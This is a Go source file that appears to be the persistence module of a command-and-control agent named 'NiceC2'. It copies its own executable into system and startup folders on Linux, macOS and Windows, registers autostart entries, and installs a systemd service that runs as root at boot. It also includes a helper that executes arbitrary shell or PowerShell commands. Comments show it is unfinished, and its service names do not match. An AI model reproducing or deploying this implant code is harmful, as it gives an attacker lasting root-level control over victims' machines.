package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/emersion/go-autostart"
)

func main() {

	// runCommand("say Hello")

	// runCommand("touch /Users/jasper/Desktop/itWorked_txt")

	runCommand("touch /home/jasper/testFile.test")

	log.Println("Starting")
	err, destination_path := installSelf()
	if err != nil {
		fmt.Println(err)
		// return
	}

	log.Println("File created at: " + destination_path)

	// THE AUTO START ISN"T WORKING!!!

	// COULD IT BE BECAUE THE WRONG USER IS LOGGED IN?

	// Removes the auto start if it already exists
	// remove_auto_start("sh", destination_path)

	// create_auto_start("sh", destination_path)

	// fmt.Println(check_enabled("sh", destination_path))

	switch runtime.GOOS {

	case "linux":
		fmt.Println("Linux")

		Linux()

	case "darwin":
		fmt.Println("MacOS")
	case "windows":
		fmt.Println("Windows")
	default:
		fmt.Println("Unsupported operating system ")

	}

}

func installSelf() (error, string) {
	// Get the name of the current executable.
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not get executable path: %v", err), ""
	}

	// Determine the default location for background applications based on the operating system.
	var dst string
	switch runtime.GOOS {
	case "linux":
		dst = "/usr/local/bin/NiceC2/"
	case "darwin":
		// dst = "/Library/Application Support/NiceC2/"

		currentUser, err := user.Current()
		if err != nil {
			panic(err)
		}
		dst = "/Users/" + currentUser.Username + "/Library/NiceC2/"

	case "windows":
		dst = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "NiceC2")
	default:
		return fmt.Errorf("unsupported operating system: %s", runtime.GOOS), ""
	}

	// Check if the directory already exists
	if _, err := os.Stat(dst); os.IsNotExist(err) {
		// Create the directory with 0755 permissions (rwxr-xr-x)
		err = os.Mkdir(dst, 0755)
		if err != nil {
			fmt.Printf("Error creating directory %s: %s\n", dst, err)
			return err, ""
		}

		fmt.Printf("Directory %s created successfully\n", dst)
	} else if err != nil {
		// Handle other errors that occurred while checking if the directory exists
		fmt.Printf("Error checking for directory %s: %s\n", dst, err)
		return err, ""
	} else {
		// Directory already exists, do nothing
		fmt.Printf("Directory %s already exists\n", dst)
	}

	// Open the destination file for writing.
	dstFile, err := os.Create(filepath.Join(dst, filepath.Base(self)))
	if err != nil {
		return fmt.Errorf("could not create destination file: %v", err), ""
	}
	defer dstFile.Close()

	// Open the source file for reading.
	srcFile, err := os.Open(self)
	if err != nil {
		return fmt.Errorf("could not open source file: %v", err), ""
	}
	defer srcFile.Close()

	// Copy the contents of the source file to the destination file.
	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file")
		return fmt.Errorf("could not copy file: %v", err), ""
	}

	// Set the executable bit on Linux and macOS.
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		err = os.Chmod(filepath.Join(dst, filepath.Base(self)), 0755)
		if err != nil {
			return fmt.Errorf("could not set executable bit: %v", err), ""
		}
	}

	return nil, filepath.Join(dst, filepath.Base(self))

}

func check_enabled(shell string, commandString string) bool {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		return true
	} else {
		return false
	}
}

func create_auto_start(shell string, commandString string) {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		log.Println("App is already enabled")

		// if err := app.Disable(); err != nil {
		// 	log.Fatal(err)
		// }
	} else {
		log.Println("Enabling app...")

		if err := app.Enable(); err != nil {
			log.Fatal(err)
		}
	}

}

func remove_auto_start(shell string, commandString string) {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		log.Println("Removing app")

		if err := app.Disable(); err != nil {
			log.Fatal(err)
		}
	} else {
		fmt.Println("App is not endabled")
	}
}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		log.Println(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			log.Println(err.Error())
			// errorMessage = err.Error()
			errorMessage = "There was an error executing. "

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {

		fmt.Println("There was an error. Ohh dear")
		log.Println(err.Error())
		errorMessage = "There was an error running the command"

		return
	}

	outString = string(out)

	return

}

func Linux() {

	// Set the path to the systemd service file
	serviceFilePath := "/etc/systemd/system/NiceC2.service"

	// Create the systemd service file
	serviceFile, err := os.Create(serviceFilePath)
	if err != nil {
		fmt.Println("Error creating service file:", err)
		return
	}
	defer serviceFile.Close()

	// Write the service file content
	_, err = serviceFile.WriteString(`[Unit]
Description=My program service
After=network.target

[Service]
ExecStart=/usr/local/bin/NiceC2/persistance_test
WorkingDirectory=/usr/local/bin/
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target`)
	if err != nil {
		fmt.Println("Error writing service file:", err)
		return
	}

	// Reload the systemd configuration
	reloadCmd := exec.Command("systemctl", "daemon-reload")
	err = reloadCmd.Run()
	if err != nil {
		fmt.Println("Error reloading systemd configuration:", err)
		return
	}

	// Enable the service to auto-start at boot
	enableCmd := exec.Command("systemctl", "enable", "myprogram.service")
	err = enableCmd.Run()
	if err != nil {
		fmt.Println("Error enabling service to auto-start at boot:", err)
		return
	}

	fmt.Println("Service created and registered to auto-start at boot as root.")

	return
}
